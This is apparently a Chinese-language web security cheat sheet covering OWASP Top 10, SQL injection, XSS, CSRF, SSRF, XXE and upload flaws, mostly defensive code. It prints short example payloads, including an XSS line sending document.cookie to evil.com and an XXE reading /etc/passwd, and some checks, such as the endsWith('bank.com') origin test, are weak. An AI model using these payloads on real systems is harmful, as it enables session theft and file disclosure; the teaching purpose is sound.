# Web 安全：XSS / CSRF / SQLi 攻防实战

> 一份按漏洞类型梳理的 Web 安全速查手册：从 OWASP Top 10 到实战防御的完整指南。

---
## 引言：生产 Bug（[AUTO] 自动生成，待人工 review）

Web 安全：XSS / CSRF / SQLi 攻防实战 的一份按漏洞类型梳理的 Web 安全速查手册：从 OWASP Top 10 到实战防御的完整指南

**但实际**：常被攻击或出 Bug 后背锅。本篇用'生产场景'切入：
线上怎么炸、有没有上线过的坑、为什么按官方文档写也会错。

> 📌 本段由 `note/scripts/add-intro.py` 自动生成（场景模板 + README 摘录）。**下次 review 时请改为真实场景 + 数字 + 反思**，目前仅满足'有引言'的最低要求。

---



## 一、OWASP Top 10（2021 版）

| 排名 | 漏洞 | 说明 |
|------|------|------|
| A01 | **访问控制失效**（Broken Access Control）| 越权访问 |
| A02 | **加密机制失效** | 数据明文存储/传输 |
| A03 | **注入**（SQL / NoSQL / 命令）| 恶意输入执行 |
| A04 | **不安全设计** | 架构层面缺陷 |
| A05 | **安全配置错误** | 默认配置 / 调试模式 |
| A06 | **易受攻击和过时的组件** | 依赖漏洞 |
| A07 | **身份识别和身份验证失败** | 弱密码 / 会话劫持 |
| A08 | **软件和数据完整性故障** | CI/CD 投毒 |
| A09 | **安全日志和监控失败** | 无日志 / 无告警 |
| A10 | **服务端请求伪造**（SSRF）| 服务端访问外部资源 |

---

## 二、SQL 注入（SQLi）

### 2.1 攻击原理

```sql
-- 正常查询
SELECT * FROM users WHERE username = 'admin' AND password = 'xxx'

-- 注入后（绕过密码验证）
SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = 'xxx'
```

### 2.2 防御方法

```java
// ❌ 错误：字符串拼接
String sql = "SELECT * FROM users WHERE username = '" + username + "'";

// ✅ 正确：参数化查询（PreparedStatement）
String sql = "SELECT * FROM users WHERE username = ?";
PreparedStatement ps = connection.prepareStatement(sql);
ps.setString(1, username);

// ✅ MyBatis #{}（自动参数化）
@Select("SELECT * FROM users WHERE username = #{username}")
User findByUsername(@Param("username") String username);
```

### 2.3 进阶防御

- ORM 框架（MyBatis / Hibernate）天然防 SQLi
- 输入验证（白名单）
- 最小权限数据库账号（不要用 root）
- WAF（Web 应用防火墙）

---

## 三、XSS（跨站脚本攻击）

### 3.1 攻击类型

| 类型 | 原理 |
|------|------|
| **反射型 XSS** | URL 参数注入恶意脚本 |
| **存储型 XSS** | 数据库存储恶意脚本（最危险）|
| **DOM 型 XSS** | 前端 DOM 操作注入 |

### 3.2 攻击示例

```html
<!-- 攻击者提交评论 -->
<script>fetch('https://evil.com?cookie=' + document.cookie)</script>
```

### 3.3 防御方法

#### 方法 1：输出转义

```java
// Java（使用 OWASP Java Encoder）
String safe = Encode.forHtml(userInput);

// JavaScript（使用成熟框架自动转义）
// React / Vue 默认转义 {{userInput}}
```

#### 方法 2：Content-Security-Policy（CSP）

```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' https://cdn.jsdelivr.net">
```

#### 方法 3：HttpOnly Cookie

```java
// 防止 JS 读取 Cookie（防 Session 窃取）
Cookie cookie = new Cookie("session", token);
cookie.setHttpOnly(true);
cookie.setSecure(true);
```

#### 方法 4：输入验证

- 白名单（不让 `<` `>` `script` 等字符）
- 用 DOMPurify 库清理 HTML

---

## 四、CSRF（跨站请求伪造）

### 4.1 攻击原理

```html
<!-- 受害者登录 bank.com，session cookie 还在 -->
<!-- 攻击者诱导访问 evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
<!-- 浏览器自动带 cookie，bank.com 以为是受害者操作 -->
```

### 4.2 防御方法

#### 方法 1：CSRF Token（推荐）

```java
// 服务端生成 token
String token = UUID.randomUUID().toString();
session.setAttribute("csrf_token", token);

// 前端表单携带
<form>
  <input type="hidden" name="csrf_token" value="${token}">
  ...
</form>

// 服务端验证
String submitted = request.getParameter("csrf_token");
String expected = (String) session.getAttribute("csrf_token");
if (!submitted.equals(expected)) {
  throw new SecurityException("Invalid CSRF token");
}
```

#### 方法 2：SameSite Cookie

```java
// Chrome 80+ 默认 SameSite=Lax（推荐）
response.setHeader("Set-Cookie", "session=xxx; SameSite=Strict; Secure; HttpOnly");
```

#### 方法 3：检查 Origin / Referer

```java
// 仅允许同源请求
String origin = request.getHeader("Origin");
if (!origin.endsWith("bank.com")) {
  throw new SecurityException("Invalid origin");
}
```

---

## 五、SSRF（服务端请求伪造）

### 5.1 攻击原理

```
攻击者 → 提交 URL（http://internal-service:8080/admin）
   → 服务器端请求这个 URL
   → 访问到内网敏感资源
```

### 5.2 防御方法

```java
// 1. URL 白名单
Set<String> allowedDomains = Set.of("api.trusted.com");
if (!allowedDomains.contains(url.getHost())) {
  throw new SecurityException("Blocked URL");
}

// 2. 禁用危险协议
if (url.getProtocol().equals("file") || url.getProtocol().equals("gopher")) {
  throw new SecurityException("Blocked protocol");
}

// 3. 解析后验证 IP（防止 DNS rebinding）
InetAddress addr = InetAddress.getByName(url.getHost());
if (addr.isSiteLocalAddress() || addr.isLoopbackAddress()) {
  throw new SecurityException("Internal IP blocked");
}

// 4. 网络层隔离（IMDSv2）
// EC2 metadata 服务使用 IMDSv2 而非 IMDSv1
```

---

## 六、XXE（XML 外部实体）

### 6.1 攻击示例

```xml
<!-- 攻击者提交的恶意 XML -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

### 6.2 防御方法

```java
// Java：禁用 DTD 解析
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

---

## 七、文件上传漏洞

### 7.1 攻击方式

- 上传 WebShell（.php / .jsp）
- 上传钓鱼文件（.html）
- 上传超大文件（DoS）

### 7.2 防御方法

```java
// 1. 白名单扩展名
List<String> ALLOWED = List.of("jpg", "png", "pdf");
String ext = getExtension(file.getOriginalFilename());
if (!ALLOWED.contains(ext)) {
  throw new SecurityException("Invalid file type");
}

// 2. 验证 MIME 类型（不信任客户端 Content-Type）
String mime = tika.detect(file.getBytes());
if (!"image/jpeg".equals(mime)) {
  throw new SecurityException("Invalid MIME type");
}

// 3. 重命名文件
String newName = UUID.randomUUID() + "." + ext;

// 4. 存储在 Web 根目录外（防直接访问）

// 5. 设置上传目录无执行权限（Nginx）
location /uploads/ {
  location ~ .*\.(php|jsp|asp)$ { deny all; }
}
```

---

## 八、暴力破解防护

### 8.1 限流（Rate Limiting）

```java
// 用 Redis + Lua 实现滑动窗口限流
@Component
public class LoginRateLimiter {
  @Autowired
  private StringRedisTemplate redis;

  public boolean allowLogin(String ip) {
    String key = "login:" + ip;
    Long count = redis.opsForValue().increment(key);
    if (count == 1) {
      redis.expire(key, 60);  // 60 秒窗口
    }
    return count <= 5;          // 60 秒内最多 5 次
  }
}
```

### 8.2 验证码 + 多因素认证

- 登录失败 3 次 → 弹验证码
- 登录失败 5 次 → 锁定账号 30 分钟
- 启用 MFA（短信 / 邮件 / TOTP）

---

## 九、HTTP 安全头

```nginx
# Nginx 配置
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "no-referrer-when-downgrade" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Content-Security-Policy "default-src 'self';" always;
```

| 头部 | 作用 |
|------|------|
| X-Frame-Options | 防点击劫持（DENY / SAMEORIGIN）|
| X-Content-Type-Options | 防 MIME 嗅探（nosniff）|
| Strict-Transport-Security | 强制 HTTPS（HSTS）|
| Content-Security-Policy | 防 XSS（CSP）|
| Referrer-Policy | 控制 Referer |

---

## 十、最佳实践

1. **输入验证（白名单）**：所有用户输入都要验证
2. **输出转义**：根据上下文（HTML / JS / URL）转义
3. **参数化查询**：永远不要字符串拼接 SQL
4. **最小权限原则**：服务账号只给必要权限
5. **HTTPS 全站**：禁用 HTTP，启用 HSTS
6. **依赖扫描**：CI 用 Snyk / Trivy / OWASP Dependency-Check
7. **WAF**：用 ModSecurity / Cloudflare WAF 防御常见攻击
8. **定期渗透测试**：至少每年一次

---

← [返回系统设计总览](../../README.md) · 📅 2026-06-28